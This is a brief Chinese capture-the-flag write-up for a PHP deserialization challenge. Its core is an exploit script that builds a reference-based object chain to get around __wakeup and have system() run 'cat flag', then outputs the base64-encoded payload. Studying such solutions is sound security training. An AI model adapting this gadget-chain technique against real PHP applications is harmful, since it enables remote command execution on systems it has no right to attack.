## 考点

反序列化

## 工具

php环境 手

## 步骤

工业互联网原题，网上搜搜就能看到非弱化版的，WP很多。

这里只给出一种解：

```php
<?php
class KeyPort {}
class Moon {}
class ArrayObj{

    private $iffinish;
    public $name;
    public function __construct(&$a)
    {
        $this->iffinish=&$a;
    }

}

class Sun {

    public function __construct(){
        $process=new KeyPort;
        $arr=new ArrayObj($process->wakeup);
        $arr->name=array('iffinish'=>false);
        $this->process=$process;
        $this->process->finish=$arr;
        $key2=new KeyPort();
        $moon=new Moon();
        $this->moon=$moon;
        $this->moon->process=$key2;
        $arr2=new ArrayObj($process->format);
        $key2->finish=$arr2;
        $arr2->name=array('iffinish'=>array('forward'=>'system'));
        $this->moon->options=array('new'=>&$this->process);
        $this->moon->_forward='cat flag';       
    }

}
$a=new Sun();
echo base64_encode(serialize($a));
```



## 总结

原本是一道很难的题，难点就在于绕wakeup，注释掉之后就简单很多。

上面给的exp是针对未注释之前的，弱化版当然也能通。
